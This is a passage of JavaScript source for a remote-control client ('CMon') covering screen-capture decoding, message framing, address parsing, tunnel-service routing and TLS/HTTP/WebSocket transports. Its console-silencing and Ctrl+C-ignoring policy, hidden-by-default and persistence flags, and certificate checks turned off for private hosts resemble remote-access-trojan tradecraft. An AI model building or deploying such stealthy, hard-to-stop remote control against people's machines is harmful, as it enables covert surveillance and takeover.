  // three lookups and two adds per channel instead of multiplies/branches.
  const crR = new Int32Array(256);
  const crG = new Int32Array(256);
  const cbG = new Int32Array(256);
  const cbB = new Int32Array(256);
  for (let i = 0; i < 256; i++) {
    const v = i - 128;
    crR[i] = (91881 * v + 32768) >> 16;
    crG[i] = -((46802 * v + 32768) >> 16);
    cbG[i] = -((22554 * v + 32768) >> 16);
    cbB[i] = (116130 * v + 32768) >> 16;
  }
  const clamp = new Uint8Array(1024);
  for (let i = 0; i < 1024; i++) {
    const v = i - 256;
    clamp[i] = v < 0 ? 0 : v > 255 ? 255 : v;
  }
  let o = 0;
  // 4:4:4 and 4:2:0 are what every capture tool produces; those two loops
  // index the planes directly instead of through the per-pixel index maps.
  if (Y.h === maxH && Y.v === maxV
    && Cb.h === Y.h && Cb.v === Y.v && Cr.h === Y.h && Cr.v === Y.v) {
    for (let y = 0; y < height; y++) {
      const row = y * Y.pw;
      const cbRow = y * Cb.pw;
      const crRow = y * Cr.pw;
      for (let x = 0; x < width; x++) {
        const yy = yP[row + x];
        const cb = cbP[cbRow + x];
        const cr = crP[crRow + x];
        out[o++] = clamp[yy + crR[cr] + 256];
        out[o++] = clamp[yy + cbG[cb] + crG[cr] + 256];
        out[o++] = clamp[yy + cbB[cb] + 256];
      }
    }
    return { width, height, data: out };
  }
  if (Y.h === maxH && Y.v === maxV && (Y.h & 1) === 0 && (Y.v & 1) === 0
    && Cb.h * 2 === Y.h && Cb.v * 2 === Y.v && Cr.h * 2 === Y.h && Cr.v * 2 === Y.v) {
    for (let y = 0; y < height; y++) {
      const row = y * Y.pw;
      const cbRow = (y >> 1) * Cb.pw;
      const crRow = (y >> 1) * Cr.pw;
      for (let x = 0; x < width; x++) {
        const cx = x >> 1;
        const yy = yP[row + x];
        const cb = cbP[cbRow + cx];
        const cr = crP[crRow + cx];
        out[o++] = clamp[yy + crR[cr] + 256];
        out[o++] = clamp[yy + cbG[cb] + crG[cr] + 256];
        out[o++] = clamp[yy + cbB[cb] + 256];
      }
    }
    return { width, height, data: out };
  }
  for (let y = 0; y < height; y++) {
    const yRow = yMap.cy[y] * Y.pw;
    const cbRow = cbMap.cy[y] * Cb.pw;
    const crRow = crMap.cy[y] * Cr.pw;
    const yCx = yMap.cx;
    const cbCx = cbMap.cx;
    const crCx = crMap.cx;
    for (let x = 0; x < width; x++) {
      const yy = yP[yRow + yCx[x]];
      const cb = cbP[cbRow + cbCx[x]];
      const cr = crP[crRow + crCx[x]];
      out[o++] = clamp[yy + crR[cr] + 256];
      out[o++] = clamp[yy + cbG[cb] + crG[cr] + 256];
      out[o++] = clamp[yy + cbB[cb] + 256];
    }
  }
  return { width, height, data: out };
}

// Uncompressed BMP (BI_RGB, 24/32-bit).  macOS screencapture can emit BMP,
// which avoids decoding a full-resolution JPEG in JS on Retina displays.
function decodeBmp(data) {
  if (data.length < 54 || data[0] !== 0x42 || data[1] !== 0x4d) {
    throw new Error('not a BMP image');
  }
  const pixelOffset = data.readUInt32LE(10);
  const headerSize = data.readUInt32LE(14);
  if (headerSize < 40) throw new Error('unsupported BMP header');
  const width = data.readInt32LE(18);
  const rawHeight = data.readInt32LE(22);
  const bits = data.readUInt16LE(28);
  const compression = data.readUInt32LE(30);
  if (width <= 0 || rawHeight === 0) throw new Error('invalid BMP dimensions');
  if (compression !== 0) throw new Error('compressed BMP is not supported');
  if (bits !== 24 && bits !== 32) throw new Error('unsupported BMP bit depth: ' + bits);
  const height = Math.abs(rawHeight);
  const topDown = rawHeight < 0;
  const stride = Math.floor((width * bits + 31) / 32) * 4;
  const need = stride * height;
  if (pixelOffset + need > data.length) throw new Error('BMP data ended early');
  const out = Buffer.allocUnsafe(width * height * 3);
  const bytes = bits / 8;
  for (let y = 0; y < height; y++) {
    const srcRow = pixelOffset + (topDown ? y : height - 1 - y) * stride;
    let dst = y * width * 3;
    for (let x = 0; x < width; x++) {
      const src = srcRow + x * bytes;
      out[dst++] = data[src + 2];             // BGR(A) -> RGB
      out[dst++] = data[src + 1];
      out[dst++] = data[src];
    }
  }
  return { width, height, data: out };
}

function decodeImage(data) {
  if (data.length >= 2 && data[0] === 0x42 && data[1] === 0x4d) {
    return decodeBmp(data);
  }
  if (data.length >= 3 && data[0] === 0xff && data[1] === 0xd8 && data[2] === 0xff) {
    return decodeJpeg(data);
  }
  return decodePng(data);
}

// Binary PPM (P6) is uncompressed RGB.  grim can emit it, which lets the
// screen-share path skip the expensive full-resolution JPEG decode: the
// samples are already in the byte layout fitRgb() expects, so only the much
// smaller output frame is JPEG-encoded.
function decodePpm(data) {
  if (data.length < 8 || data[0] !== 0x50 || data[1] !== 0x36) {
    throw new Error('not a binary PPM image');
  }
  let pos = 2;
  const fields = [];
  while (fields.length < 3) {
    while (pos < data.length) {
      const c = data[pos];
      if (c === 0x23) {                         // '#' comment through EOL
        while (pos < data.length && data[pos] !== 0x0a && data[pos] !== 0x0d) pos++;
      } else if (c === 0x20 || c === 0x09 || c === 0x0a || c === 0x0d) {
        pos++;
      } else {
        break;
      }
    }
    const start = pos;
    while (pos < data.length && data[pos] > 0x20 && data[pos] !== 0x23) pos++;
    if (start === pos) throw new Error('invalid PPM header');
    fields.push(data.toString('ascii', start, pos));
  }
  const width = parseInt(fields[0], 10);
  const height = parseInt(fields[1], 10);
  const maxval = parseInt(fields[2], 10);
  if (!Number.isFinite(width) || !Number.isFinite(height) || !Number.isFinite(maxval)
      || width <= 0 || height <= 0 || maxval < 1 || maxval > 65535) {
    throw new Error('invalid PPM header');
  }
  if (data[pos] === 0x0d && data[pos + 1] === 0x0a) pos += 2;
  else if (pos < data.length && data[pos] <= 0x20) pos += 1;
  const bytes = maxval > 255 ? 2 : 1;
  const need = width * height * 3 * bytes;
  if (pos + need > data.length) throw new Error('PPM data ended early');
  if (bytes === 1 && maxval === 255) {
    return { width, height, data: data.subarray(pos, pos + need) };
  }
  const out = Buffer.allocUnsafe(width * height * 3);
  if (bytes === 1) {
    for (let i = 0; i < out.length; i++) {
      out[i] = Math.round((data[pos + i] * 255) / maxval);
    }
  } else {
    for (let i = 0, j = pos; i < out.length; i++, j += 2) {
      const value = (data[j] << 8) | data[j + 1];
      out[i] = maxval === 65535 ? data[j] : Math.round((value * 255) / maxval);
    }
  }
  return { width, height, data: out };
}

// ---------------------------------------------------------------------------
// Console and signal policy
//
// The client must never print to its console.  Node writes nothing unless we
// do, so "silence" means: no console calls, fatal errors into CMON_LOG, and a
// Ctrl+C that can never end the process (children still get their own SIGINT
// because we catch the signal instead of ignoring it).
// ---------------------------------------------------------------------------
function silenceConsole() {
  process.on('SIGINT', () => { /* Ctrl+C is never a way to stop this client */ });
  process.on('uncaughtException', (e) => {
    log('[fatal] uncaught exception:', errorText(e), (e && e.stack) ? String(e.stack) : '');
  });
  process.on('unhandledRejection', (e) => {
    log('[fatal] unhandled rejection:', errorText(e), (e && e.stack) ? String(e.stack) : '');
  });
  // A closed stdout/stderr pipe must never raise into the client.
  try { process.stdout.on('error', () => {}); } catch { /* ignore */ }
  try { process.stderr.on('error', () => {}); } catch { /* ignore */ }
}

// ---------------------------------------------------------------------------
// Wire protocol framing (matches client.py / controller.py exactly)
//
// Every application message is a 4-byte big-endian length followed by UTF-8
// JSON.  sendMsg is serialized by a per-connection mutex so a screen-share
// frame and a command reply can never interleave their headers and payloads.
// ---------------------------------------------------------------------------
const CRLF = Buffer.from('\r\n', 'ascii');
const CRLF2 = Buffer.from('\r\n\r\n', 'ascii');
const CANCELED = new Map();
const CANCEL_EXEMPT = new Set([
  'exit', 'hello', 'cancel', 'cmd_kill', 'screenshare_stop',
  'transfer_begin', 'transfer_entries', 'transfer_file_begin',
  'transfer_chunk', 'transfer_file_end', 'transfer_abort', 'transfer_end',
]);
const DEFERRED = [];
const MAX_DEFERRED = 32;
const MAX_DEFERRED_BYTES = 128 * 1024 * 1024;

function validReqId(reqId) {
  const t = typeof reqId;
  return t === 'string' || t === 'number' || t === 'boolean';
}

function markCanceled(reqId, why = 'Ctrl+Z') {
  if (reqId == null || !validReqId(reqId)) return;
  CANCELED.set(reqId, why);
  if (CANCELED.size > 512) {
    let n = 0;
    for (const key of CANCELED.keys()) {
      if (n++ >= 64) break;
      CANCELED.delete(key);
    }
  }
}

function isCanceled(reqId) {
  if (reqId == null || !validReqId(reqId)) return false;
  return CANCELED.has(reqId);
}

function forgetCanceled(reqId) {
  if (reqId == null || !validReqId(reqId)) return null;
  const why = CANCELED.get(reqId);
  CANCELED.delete(reqId);
  return why === undefined ? null : why;
}

function messageWeight(item) {
  let total = 0;
  const stack = [item];
  while (stack.length) {
    const value = stack.pop();
    if (typeof value === 'string') total += value.length;
    else if (value !== null && typeof value === 'object') {
      if (Array.isArray(value)) stack.push(...value);
      else {
        for (const key of Object.keys(value)) {
          total += key.length;
          stack.push(value[key]);
        }
      }
    } else if (value === null) total += 1;
    else total += 8;
    if (total > MAX_DEFERRED_BYTES) return total;
  }
  return total;
}

function deferMessage(msg) {
  if (DEFERRED.length >= MAX_DEFERRED) return false;
  const weight = messageWeight(msg);
  let queued = 0;
  for (const item of DEFERRED) queued += messageWeight(item);
  if (queued + weight > MAX_DEFERRED_BYTES) return false;
  DEFERRED.push(msg);
  return true;
}

async function recvMsg(conn, deadline = null) {
  const debug = isOn(process.env.CMON_DEBUG_RECV);
  try {
    const header = await conn.queue.readExact(4, { deadline });
    if (!header) {
      if (debug) log('[debug] recv: connection closed before a header');
      return null;
    }
    const size = header.readUInt32BE(0);
    if (size > MAX_MSG) {                        // desynced/garbage - reconnect
      if (debug) log('[debug] recv: header size ' + size + ' exceeds MAX_MSG');
      return null;
    }
    const payload = await conn.queue.readExact(size, { stallFirst: true, deadline });
    if (!payload) {
      if (debug) log('[debug] recv: connection closed inside a ' + size + ' byte message');
      return null;
    }
    let msg = null;
    try {
      msg = JSON.parse(payload.toString('utf8'));
    } catch (e) {
      // A message that does not parse has desynchronized this stream; the
      // caller reconnects.  Value errors are contained here (not thrown), so
      // one bad message cannot abort an unrelated background transfer.
      if (debug) log('[debug] recv: JSON parse failed: ' + errorText(e));
      return null;
    }
    return (msg && typeof msg === 'object' && !Array.isArray(msg)) ? msg : null;
  } catch (e) {
    if (debug) log('[debug] recv failed: ' + errorText(e));
    return null;
  }
}

async function sendMsg(conn, obj) {
  const payload = Buffer.from(JSON.stringify(obj), 'utf8');
  const frame = Buffer.allocUnsafe(4 + payload.length);
  frame.writeUInt32BE(payload.length, 0);
  payload.copy(frame, 4);
  await conn.write(frame);
}

// ---------------------------------------------------------------------------
// Address parsing and arguments (mirrors parse_args in client.py)
// ---------------------------------------------------------------------------
const TUNNEL_SUFFIXES = [
  'ngrok-free.app', 'ngrok-free.dev', 'ngrok.app', 'ngrok.io', 'ngrok.dev',
  'pinggy.link', 'pinggy-free.link', 'pinggy.io', 'pinggy.net', 'pinggy.online',
  'pinggy.top', 'trycloudflare.com', 'loca.lt', 'serveo.net', 'localhost.run',
  'bore.pub', 'tunnelmole.net', 'telebit.cloud',
];

function looksLikeTunnelHost(host) {
  const value = String(host || '').trim().toLowerCase().replace(/\.$/, '');
  return TUNNEL_SUFFIXES.some((suffix) =>
    value === suffix || value.endsWith('.' + suffix));
}

function defaultPortForScheme(scheme, host = null) {
  const s = String(scheme || '').toLowerCase();
  if (s === 'http') return 80;
  if (s === 'https') return 443;
  if (s === 'ws') return 80;
  if (s === 'wss') return 443;
  if (s === 'tls') return 443;
  if (s === 'tcp') return DEFAULT_PORT;
  if (host && looksLikeTunnelHost(host)) return 443;
  return DEFAULT_PORT;
}

function parseAddress(raw, explicitPort = null) {
  let text = String(raw == null ? '' : raw).trim();
  if (!text) text = DEFAULT_IP;
  let scheme = '';
  let host = '';
  let port = null;
  if (text.includes('://')) {
    let parsed;
    try { parsed = new URL(text); } catch { throw new Error('invalid address ' + JSON.stringify(text)); }
    scheme = (parsed.protocol || '').replace(/:$/, '').toLowerCase();
    if (scheme === 'ws') scheme = 'http';
    else if (scheme === 'wss') scheme = 'https';
    if (!['tcp', 'tls', 'http', 'https', 'auto'].includes(scheme)) {
      throw new Error('unsupported address scheme ' + JSON.stringify(scheme));
    }
    host = parsed.hostname || '';
    if (parsed.port) port = parseInt(parsed.port, 10);
  } else if (text.startsWith('[')) {
    const end = text.indexOf(']');
    if (end < 0) throw new Error('unclosed IPv6 address ' + JSON.stringify(raw));
    host = text.slice(1, end);
    const rest = text.slice(end + 1);
    if (rest.startsWith(':')) port = parseInt(rest.slice(1), 10);
  } else if ((text.match(/:/g) || []).length === 1) {
    const idx = text.lastIndexOf(':');
    const possiblePort = text.slice(idx + 1);
    if (/^\d+$/.test(possiblePort)) {
      host = text.slice(0, idx);
      port = parseInt(possiblePort, 10);
    } else {
      host = text;
    }
  } else {
    host = text;
  }
  host = (host || '').trim().replace(/^\[|\]$/g, '');
  if (!host) throw new Error('address has no host: ' + JSON.stringify(raw));
  if (explicitPort != null) port = explicitPort;
  if (port == null) {
    port = defaultPortForScheme(scheme || (CONNECTION_TYPE !== 'auto' ? CONNECTION_TYPE : ''), host);
  }
  if (!(Number.isFinite(port) && port > 0 && port < 65536)) {
    throw new Error('port ' + port + ' is out of range');
  }
  if (!scheme) {
    if (CONNECTION_TYPE !== 'auto') scheme = CONNECTION_TYPE;
    else if (looksLikeTunnelHost(host) || port === 443) scheme = 'https';
    else scheme = 'auto';
  }
  return { host, port, scheme };
}

function parseArgs(argv) {
  let ip = DEFAULT_IP;
  let portOverride = null;
  let persist = false;
  let remove = false;
  let visible = false;
  let logFile = null;
  const positional = [];
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (a === '--persist') persist = true;
    else if (a === '--remove-persist' || a === '--remove') remove = true;
    else if (a === '--visible') visible = true;
    else if (a === '--log-file' || a === '--logfile') {
      if (i + 1 < argv.length) { i += 1; logFile = argv[i]; }
      else log('[!] --log-file needs a path; ignoring it.');
    } else if (a.startsWith('--log-file=')) {
      logFile = a.split('=').slice(1).join('=') || null;
    } else if (a.startsWith('-') && a !== '-') {
      log('[!] Unknown option ' + JSON.stringify(a) + '; ignoring it.');
    } else {
      positional.push(a);
    }
  }
  if (positional.length > 2) {
    log('[!] Extra arguments ignored: ' + positional.slice(2).join(' '));
  }
  if (positional.length) ip = positional[0];
  if (positional.length > 1) {
    if (/^-?\d+$/.test(positional[1])) portOverride = parseInt(positional[1], 10);
    else log('[!] ' + JSON.stringify(positional[1]) + ' is not a port number; ignoring it.');
  }
  let addr;
  try {
    addr = parseAddress(ip, portOverride);
  } catch (e) {
    log('[!] Bad controller address ' + JSON.stringify(ip) + ': ' + errorText(e)
      + '; using ' + DEFAULT_IP + ':' + DEFAULT_PORT + '.');
    addr = parseAddress(DEFAULT_IP);
  }
  return { host: addr.host, port: addr.port, scheme: addr.scheme, persist, remove, visible, logFile };
}

function loopbackTarget(address) {
  const value = String(address || '').trim().replace(/^\[|\]$/g, '').toLowerCase();
  return value === 'localhost' || value === '::1' || value === '0.0.0.0' || value.startsWith('127.');
}

function isPrivateHost(host) {
  const value = String(host || '').trim().replace(/^\[|\]$/g, '').toLowerCase();
  if (value === 'localhost' || value === '0.0.0.0' || value === '::1') return true;
  if (value.endsWith('.local') || value.endsWith('.lan') || value.endsWith('.internal')) return true;
  if (!net.isIP(value)) return false;
  if (value.includes('.')) {
    const o = value.split('.').map((p) => Number(p));
    if (o.length !== 4 || o.some((n) => !Number.isInteger(n) || n < 0 || n > 255)) return false;
    if (o[0] === 10 || (o[0] === 172 && o[1] >= 16 && o[1] <= 31)
        || (o[0] === 192 && o[1] === 168) || (o[0] === 169 && o[1] === 254)
        || o[0] === 127 || (o[0] === 100 && o[1] >= 64 && o[1] <= 127)
        || (o[0] === 192 && o[1] === 0 && o[2] === 0)
        || (o[0] === 198 && (o[1] === 18 || o[1] === 19))
        || (o[0] === 198 && o[1] === 51 && o[2] === 100)
        || (o[0] === 203 && o[1] === 0 && o[2] === 113)
        || o[0] >= 224 || (o[0] === 0 && o[1] === 0 && o[2] === 0 && o[3] === 0)) return true;
    return false;
  }
  return value === '::1' || value === '::' || value.startsWith('fe80:')
    || value.startsWith('fc') || value.startsWith('fd') || value.startsWith('fec0:');
}

function connectErrorHint(e) {
  const code = e && e.code ? String(e.code) : '';
  if (code === 'ENOTFOUND' || code === 'EAI_AGAIN') return 'cannot resolve that address; check the IP or hostname';
  if (code === 'ETIMEDOUT') {
    let hint = 'timed out - wrong address or port, a firewall drops the packets, '
      + 'or host -> guest over NAT without a port forward';
    if (isAndroid() && androidApi() >= 37) {
      hint += '; on Android 17+ allow Nearby devices for Termux (Settings > Apps > Termux > Permissions)';
    }
    return hint;
  }
  if (code === 'ECONNREFUSED') {
    return 'connection refused - nothing is listening there (controller not running, wrong port, or a firewall)';
  }
  if (code === 'ECONNRESET') return 'connection reset - something on that port is not the controller';
  if (code === 'ENETUNREACH' || code === 'EHOSTUNREACH' || code === 'ENETDOWN') {
    return 'no route to that address - the machines are not on the same network';
  }
  return errorText(e);
}

// ---------------------------------------------------------------------------
// DNS + raw socket utilities
// ---------------------------------------------------------------------------
const RESOLVERS = new Map();

function resolveHost(host, port) {
  const key = host + ':' + port;
  let entry = RESOLVERS.get(key);
  const current = Date.now();
  if (entry && current - entry.created > 60000) entry = undefined;
  if (!entry) {
    entry = { created: current, promise: null };
    entry.promise = dns.promises.lookup(host, { all: true, verbatim: false }).then(
      (rows) => rows.map((r) => ({ address: r.address, family: r.family })),
      (e) => { RESOLVERS.delete(key); throw e; });
    entry.promise.catch(() => {});
    RESOLVERS.set(key, entry);
  }
  const timeout = new Promise((_, reject) => {
    const timer = setTimeout(() => reject(new Error('name resolution timed out for ' + host)), 5000);
    if (timer.unref) timer.unref();
  });
  return Promise.race([entry.promise, timeout]);
}

function connectOne(address, port) {
  return new Promise((resolve, reject) => {
    let settled = false;
    const sock = net.createConnection({ host: address, port, allowHalfOpen: false });
    const timer = setTimeout(() => {
      if (settled) return;
      settled = true;
      try { sock.destroy(); } catch { /* ignore */ }
      reject(Object.assign(new Error('connect timed out'), { code: 'ETIMEDOUT' }));
    }, CONNECT_TIMEOUT * 1000);
    sock.once('connect', () => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      sock.setTimeout(0);
      resolve(sock);
    });
    sock.once('error', (e) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      try { sock.destroy(); } catch { /* ignore */ }
      reject(e);
    });
  });
}

async function connectTarget(host, port) {
  if (net.isIP(host)) return connectOne(host, port);
  const addresses = await resolveHost(host, port);
  let lastError = null;
  for (const item of addresses) {
    try {
      return await connectOne(item.address, port);
    } catch (e) {
      lastError = e;
    }
  }
  throw lastError || new Error('no usable address for ' + host);
}

function tuneSocket(socket) {
  try { socket.setNoDelay(true); } catch { /* ignore */ }
  try { socket.setKeepAlive(true, KEEPALIVE_IDLE * 1000); } catch { /* ignore */ }
}

// Write a buffer in bounded chunks, judging the peer by *progress*: a slow
// link that keeps draining is fine, a peer that accepts nothing for the stall
// window is dropped and the reconnect loop takes over (mirrors _send_chunked).
function rawWriteAll(socket, buf, stallMs = SCREEN_SEND_TIMEOUT * 1000, deadline = null) {
  return new Promise((resolve, reject) => {
    let offset = 0;
    const step = () => {
      if (offset >= buf.length) return resolve();
      if (deadline != null && now() > deadline) {
        return reject(new Error('send timed out: transfer made too little progress'));
      }
      const piece = buf.subarray(offset, offset + SEND_CHUNK);
      let done = false;
      let lastBytes = Number(socket.bytesWritten) || 0;
      let lastProgress = Date.now();
      const timer = setInterval(() => {
        if (done) return;
        const written = Number(socket.bytesWritten) || 0;
        if (written !== lastBytes) {
          lastBytes = written;
          lastProgress = Date.now();
        } else if (Date.now() - lastProgress > stallMs) {
          done = true;
          clearInterval(timer);
          try { socket.destroy(); } catch { /* ignore */ }
          reject(new Error('send stalled: controller stopped reading'));
        }
      }, Math.max(50, Math.min(1000, Math.floor(stallMs / 4))));
      if (timer.unref) timer.unref();
      try {
        socket.write(piece, (err) => {
          if (done) return;
          done = true;
          clearInterval(timer);
          if (err) return reject(err);
          offset += piece.length;
          setImmediate(step);
        });
      } catch (e) {
        if (!done) {
          done = true;
          clearInterval(timer);
          reject(e);
        }
      }
    };
    step();
  });
}

function socketSourceQueue(socket) {
  const queue = new ByteQueue(RECV_QUEUE_MAX);
  let paused = false;
  const maybePause = () => {
    if (paused || queue.closed) return;
    if (queue.chunks.length && queue.length >= queue.maxBytes) {
      paused = true;
      try { socket.pause(); } catch { /* ignore */ }
    }
  };
  queue.onConsume = () => {
    if (!paused) return;
    if (queue.length < queue.maxBytes / 2) {
      paused = false;
      try { socket.resume(); } catch { /* ignore */ }
    }
  };
  socket.on('data', (b) => {
    queue.push(b);
    maybePause();
  });
  socket.on('error', (e) => queue.close(e));
  socket.on('close', () => queue.close());
  return queue;
}

// ---------------------------------------------------------------------------
// TLS policy (mirrors _client_tls_context)
// ---------------------------------------------------------------------------
function clientTlsOptions(host, allowSelfSigned = false) {
  const verify = isOn(process.env.CONTROLLER_TLS_VERIFY);
  const insecure = isOn(process.env.CONTROLLER_TLS_INSECURE);
  const priv = isPrivateHost(host);
  const opts = { ALPNProtocols: ['http/1.1'], minVersion: 'TLSv1.2' };
  if (verify) {
    opts.rejectUnauthorized = true;
    const ca = (process.env.CONTROLLER_TLS_CA || '').trim();
    if (ca) {
      try { opts.ca = fs.readFileSync(ca); }
      catch (e) { log('[!] cannot read CONTROLLER_TLS_CA:', errorText(e)); }
    }
  } else if (insecure || priv || allowSelfSigned) {
    opts.rejectUnauthorized = false;
  } else {
    opts.rejectUnauthorized = true;
  }
  return opts;
}

function wrapClientTls(parent, host, allowSelfSigned = false) {
  const opts = clientTlsOptions(host, allowSelfSigned);
  if (!net.isIP(host)) opts.servername = host;
  return new Promise((resolve, reject) => {
    let settled = false;
    let sock;
    try {
      sock = tls.connect({ socket: parent, ...opts }, () => {
        if (settled) return;
        settled = true;
        try { sock.setTimeout(0); } catch { /* ignore */ }
        const selected = sock.alpnProtocol;
        if (selected && selected !== 'http/1.1') {
          try { sock.destroy(); } catch { /* ignore */ }
          return reject(new TransportNotSupported(
            'TLS negotiated ' + JSON.stringify(selected) + '; this tunnel uses HTTP/1.1'));
        }
        resolve(sock);
      });
    } catch (e) {
      return reject(e);
    }
    sock.setTimeout(HTTP_HANDSHAKE_TIMEOUT * 1000, () => {
      if (settled) return;
      settled = true;
      try { sock.destroy(); } catch { /* ignore */ }
      reject(new Error('TLS handshake failed: timed out'));
    });
    sock.once('error', (e) => {
      if (settled) return;
      settled = true;
      try { sock.destroy(); } catch { /* ignore */ }
      reject(e);
    });
  });
}

// ---------------------------------------------------------------------------
// HTTP parsing helpers
// ---------------------------------------------------------------------------
function hostHeader(host, port) {
  let value = String(host);
  if (value.includes(':') && !value.startsWith('[')) value = '[' + value + ']';
  return value + ':' + port;
}

async function readHttpHead(queue, timeoutMs) {
  const block = await queue.readUntil(CRLF2, HTTP_MAX_HEADER, { deadline: now() + timeoutMs / 1000 });
  if (!block) throw new Error('HTTP handshake timed out');
  const text = block.subarray(0, block.length - 4).toString('latin1');
  return text.split('\r\n');
}

function httpHeaders(lines) {
  const headers = new Map();
  for (const line of lines) {
    if (!line) continue;
    if (line[0] === ' ' || line[0] === '\t') throw new Error('folded HTTP headers are not accepted');
    const idx = line.indexOf(':');
    if (idx < 0) throw new Error('malformed HTTP response header');
    const key = line.slice(0, idx).trim().toLowerCase();
    if (!key) throw new Error('empty HTTP response header');
    const value = line.slice(idx + 1).trim();
    const old = headers.get(key);
    headers.set(key, old ? old + ',' + value : value);
  }
  return headers;
}

function httpStatus(lines) {
  const parts = lines.length ? lines[0].split(/\s+/) : [];
  if (parts.length < 2) throw new TransportNotSupported('malformed HTTP status line');
  const code = parseInt(parts[1], 10);
  if (!Number.isFinite(code)) throw new TransportNotSupported('malformed HTTP status code');
  return { code, text: parts.slice(2).join(' '), version: (parts[0] || '').toUpperCase() };
}

function tunnelHeaders(host, token = null, role = 'control') {
  const headers = [
    'User-Agent: ' + CMON_USER_AGENT,
    'Accept: */*',
    'Cache-Control: no-store',
    'ngrok-skip-browser-warning: 1',
    'X-Pinggy-No-Screen: 1',
    'X-CMon-Role: ' + role,
  ];
  if (token) headers.push('X-CMon-Token: ' + token);
  return headers;
}

// ---------------------------------------------------------------------------
// Transport adapters.  Every adapter exposes the same interface:
//   queue      ByteQueue of incoming application bytes
//   write(buf) serialized send (frames/chunks/requests as needed)
//   close()    release everything and unblock readers
//   closed     set once the link is unusable
// ---------------------------------------------------------------------------
class SocketConn {
  constructor(socket, name) {
    this.socket = socket;
    this.name = name;
    this.queue = socketSourceQueue(socket);
    this.closed = false;
    this.kind = 'socket';
    // One writer at a time: JSON replies, screen frames and transfer chunks
    // are produced by independent async loops, and a 512 KiB write can be
    // preempted in the middle (same reason client.py has SEND_LOCK).
    this.sendMutex = new Mutex();
  }

  async write(buf) {
    if (this.closed || this.queue.closed) throw new Error(this.name + ' is closed');
    return this.sendMutex.run(async () => {
      if (this.closed || this.queue.closed) throw new Error(this.name + ' is closed');
      await rawWriteAll(this.socket, buf);
      return buf.length;
    });
  }

  close() {
    if (this.closed) return;
    this.closed = true;
    try { this.socket.destroy(); } catch { /* ignore */ }
    this.queue.close();
  }
}

class HttpTunnelConn {
  constructor(socket, source, name) {
    this.socket = socket;
    this.source = source;
    this.name = name;
    this.queue = new ByteQueue(RECV_QUEUE_MAX);
    this.closed = false;
    this.kind = 'http-stream';
    this.writeClosed = false;
    this.sendMutex = new Mutex();
    this.lastRx = now();
    this.nextPing = this.lastRx + CMON_HTTP_PING;
    this._pump();
  }

  async _rawSend(data) {
    await rawWriteAll(this.socket, data, HTTP_SEND_STALL_TIMEOUT * 1000);
  }

  async write(buf) {
    if (this.closed || this.writeClosed) throw new Error('HTTP tunnel is closed');
    return this.sendMutex.run(async () => {
      if (this.closed || this.writeClosed) throw new Error('HTTP tunnel is closed');
      const header = Buffer.from(buf.length.toString(16) + '\r\n', 'ascii');
      try {
        await this._rawSend(Buffer.concat([header, buf, CRLF]));
      } catch (e) {
        this._broken();
        throw e;
      }
      return buf.length;
    });
  }

  async _sendHeartbeat() {
    if (this.closed || this.writeClosed) return;
    try {
      await this.sendMutex.run(async () => {
        if (this.closed || this.writeClosed) return;
        await this._rawSend(Buffer.from('1;cmon-ping\r\n \r\n', 'ascii'));
      });
    } catch {
      this._broken();
    }
  }

  _tick() {
    const t = now();
    if (t >= this.nextPing) {
      this.nextPing = t + CMON_HTTP_PING;
      this._sendHeartbeat();
    }
    if (t - this.lastRx > CMON_HTTP_DEAD) this._broken();
  }

  async _pump() {
    try {
      while (!this.closed) {
        const line = await this.source.readUntil(CRLF, HTTP_MAX_LINE, { deadline: now() + 0.6 });
        if (line === null) {
          if (this.source.closed) throw new Error('HTTP tunnel closed');
          this._tick();
          continue;
        }
        this.lastRx = now();
        const text = line.subarray(0, line.length - 2).toString('latin1');
        if (!text) continue;
        const semi = text.indexOf(';');
        const sizeText = (semi >= 0 ? text.slice(0, semi) : text).trim();
        const extensions = semi >= 0 ? text.slice(semi + 1).toLowerCase() : '';
        const size = parseInt(sizeText, 16);
        if (!Number.isFinite(size) || size < 0) throw new Error('invalid HTTP chunk size');
        if (size > HTTP_MAX_CHUNK) throw new Error('HTTP chunk is too large');
        if (size === 0) {
          let trailerBytes = 0;
          let trailerCount = 0;
          for (;;) {
            const trailer = await this.source.readUntil(CRLF, HTTP_MAX_LINE, { deadline: now() + 5 });
            if (trailer === null) throw new Error('HTTP tunnel closed during trailers');
            trailerBytes += trailer.length;
            if (trailerBytes > HTTP_MAX_HEADER) throw new Error('HTTP trailers are too large');
            if (trailer.length <= 2) break;
            trailerCount += 1;
            if (trailerCount > 128) throw new Error('too many HTTP trailers');
          }
          break;
        }
        const heartbeat = extensions.includes('cmon-ping');
        let remaining = size;
        while (remaining > 0) {
          const piece = await this.source.readExact(Math.min(remaining, RECV_CHUNK), { stallFirst: true });
          if (!piece) throw new Error('HTTP chunk ended early');
          if (!heartbeat) {
            if (!(await this.queue.waitForRoom())) throw new Error('HTTP tunnel closed');
            this.queue.push(piece);
          }
          remaining -= piece.length;
          this.lastRx = now();
        }
        const term = await this.source.readExact(2, { stallFirst: true });
        if (!term || term[0] !== 0x0d || term[1] !== 0x0a) throw new Error('missing HTTP chunk terminator');
      }
    } catch (e) {
      if (!this.closed) log('[http-tunnel] pump ended:', errorText(e));
    } finally {
      this._broken();
    }
  }

  shutdownWrite() {
    if (this.closed || this.writeClosed) return;
    this.writeClosed = true;
    this.sendMutex.run(async () => {
      try { await this._rawSend(Buffer.from('0\r\n\r\n', 'ascii')); } catch { /* ignore */ }
    }).catch(() => {});
  }

  _broken() {
    if (!this.closed) {
      this.closed = true;
      this.queue.close();
      try { this.source.close(); } catch { /* ignore */ }
      try { this.socket.destroy(); } catch { /* ignore */ }
    }
  }

  close() {
    this._broken();
  }
}

class WsTunnelConn {
  constructor(socket, source, name) {
    this.socket = socket;
    this.source = source;
    this.name = name;
    this.queue = new ByteQueue(RECV_QUEUE_MAX);
    this.closed = false;
    this.kind = 'websocket';
    this.writeClosed = false;
    this.sendMutex = new Mutex();
    this.lastRx = now();
    this.nextPing = this.lastRx + CMON_WS_PING;
    this._pump();
  }

  _frame(payload, opcode) {
    if (payload.length > MAX_MSG) throw new Error('WebSocket frame is too large');
    let header;
    if (payload.length < 126) {
      header = Buffer.from([0x80 | opcode, 0x80 | payload.length]);
    } else if (payload.length < 65536) {
      header = Buffer.allocUnsafe(4);
      header[0] = 0x80 | opcode;
      header[1] = 0x80 | 126;
      header.writeUInt16BE(payload.length, 2);
    } else {
      header = Buffer.allocUnsafe(10);
      header[0] = 0x80 | opcode;
